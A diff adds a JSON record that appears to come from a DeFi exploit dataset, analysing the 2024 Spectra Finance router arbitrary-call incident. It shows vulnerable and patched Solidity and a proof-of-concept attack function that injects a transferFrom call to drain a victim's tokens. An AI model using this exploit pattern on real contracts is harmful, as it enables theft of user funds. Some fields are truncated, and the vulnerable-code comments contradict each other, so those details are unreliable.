@@ -1,0 +1,33 @@
+{
+ "id": "2024__2024-07-23_Spectra_ArbitraryCall_ETH",
+ "source_file": "2024/2024-07-23_Spectra_ArbitraryCall_ETH.md",
+ "title": "Spectra Finance — Router Arbitrary External Call Vulnerability Analysis",
+ "date": "2024-07-23",
+ "protocol": "Spectra Finance",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$73,000 (188,013.365 asdCRV tokens)",
+ "loss_usd": 73000.0,
+ "root_cause": "The `KYBER_SWAP(0x12)` command was missing from the `_dispatch()` implementation, allowing arbitrary external calls through the router",
+ "attack_tx": "0x491c...0744",
+ "vulnerable_contract": null,
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ defined but not implemented in _dispatch()\n}",
+  "// ❌ Dispatcher.sol (vulnerable version) — implementation: 0x7dcdea738c2765398baf66e4dbbcd2769f4c00dc\n// KYBER_SWAP(0x12) handling branch is completely absent\n\nfunction _dispatch(bytes1 _commandType, bytes calldata _inputs) internal {\n    uint256 command = uint8(_commandType & Commands.COMMAND_TYPE_MASK);\n\n    if (command == Commands.TRANSFER_FROM) {            // 0x00\n        // ...\n    } else if (command == Commands.TRANSFER_FROM_WITH_PERMIT) {  // 0x01\n        // ...\n    } else if (command == Commands.TRANSFER) {          // 0x02\n        // ...\n    } else if (command == Commands.CURVE_SWAP) {        // 0x03\n        // ...\n    }\n    // ... (0x04 ~ 0x11 handlers) ...\n\n    // ❌ KYBER_SWAP(0x12) branch is missing!\n    // The attacker sends command 0x12, but the router actually executes the direct call\n    // → execute() can run arbitrary calls with msgSender set to the attack contract\n\n    } else {\n        revert InvalidCommandType(command);  // 0x12 reverts here\n    }\n}",
+  "// PoC attack function — actual encoding structure\nfunction attack() public {\n    bytes memory datas = abi.encode(\n        address(asdCRV),       // [1] kyberRouter slot → actually the asdCRV token address ❌\n        address(0xEeee...EEeE), // [2] tokenIn (ETH dummy address)\n        0,                      // [3] amountIn\n        address(this),          // [4] tokenOut (irrelevant)\n        1,                      // [5] expectedAmountOut (irrelevant)\n        // ❌ [6] targetData: directly injected transferFrom(victim → attacker) selector\n        abi.encodeWithSelector(\n            bytes4(0x23b872dd),     // transferFrom(address,address,uint256)\n            address(victim),        // from: victim address\n            address(this),          // to: attack contract\n            asdCRV.balanceOf(address(victim))  // amount: victim's full balance\n        )\n    );\n\n    bytes memory command = hex\"12\";  // KYBER_SWAP command\n    bytes[] memory data = new bytes[](1);\n    data[0] = datas;\n\n    // execute(commands, inputs, deadline) call\n    // ❌ Router executes kyberRouter(asdCRV).call(targetData=transferFrom)\n    address(VulnContract).call(\n        abi.encodeWithSelector(bytes4(0x3593564c), command, data, block.timestamp + 20)\n    );\n}"
+ ],
+ "code_after": [
+  "✅ Commands.sol — KYBER_SWAP command is defined\nlibrary Commands {\n    bytes1 internal constant COMMAND_TYPE_MASK = 0x3f;\n\n    // ... other commands (0x00 ~ 0x11) ...\n\n    /**\n     * Performs a swap on Kyberswap.\n     * (address kyberRouter, address tokenIn, uint256 amountIn,\n     *  address tokenOut, uint256 expectedAmountOut, bytes targetData)\n     */\n    uint256 constant KYBER_SWAP = 0x12;  //",
+  "// ✅ Dispatcher.sol (patched version) — KYBER_SWAP handler added\n// Source: perspectivefi/spectra-core GitHub\n\n} else if (command == Commands.KYBER_SWAP) {\n    // ✅ Immediately revert if kyberRouter is not set\n    if (kyberRouter == address(0)) {\n        revert KyberRouterNotSet();\n    }\n\n    // ✅ Decode only core parameters: tokenIn, amountIn, tokenOut, etc.\n    // (kyberRouter is managed as a separate state variable — not user-controllable)\n    (address tokenIn, uint256 amountIn, address tokenOut, , bytes memory targetData) = abi\n        .decode(_inputs, (address, uint256, address, uint256, bytes));\n\n    // ✅ Special handling when tokenOut is ETH (prevents arbitrary calls)\n    if (tokenOut == Constants.ETH) {\n        revert AddressError();\n    }\n\n    if (tokenIn == Constants.ETH) {\n        // ✅ Validate msgValue accuracy for ETH transfers\n        if (msgValue != amountIn) {\n            revert AmountError();\n        }\n        // ✅ Call only the admin-configured kyberRouter\n        (bool success, ) = kyberRouter.call{value: msgValue}(targetData);\n        if (!success) {\n            revert CallFailed();\n        }\n    } else {\n        // ✅ Resolve tokenIn balance then approve only the allowed router\n        amountIn = _resolveTokenValue(tokenIn, amountIn);\n        IERC20(tokenIn).forceApprove(kyberRouter, amountIn);\n        // ✅ Call only the admin-configured kyberRouter address (no arbitrary address allowed)\n        (bool success, ) = kyberRouter.call(targetData);\n        if (!success) {\n            revert CallFailed();\n        }\n    }"
+ ],
+ "steps": [
+  "→ Implementation: 0x7dcd...00dc",
+  "❌ Unimplemented branch → decode inputs",
+  "✅ Transfer event emitted: victim → attack contract"
+ ],
+ "other_code": [
+  "KYBER_SWAP: (address kyberRouter, address tokenIn, uint256 amountIn, address tokenOut, uint256 expectedAmountOut, bytes targetData)"
+ ]
+}
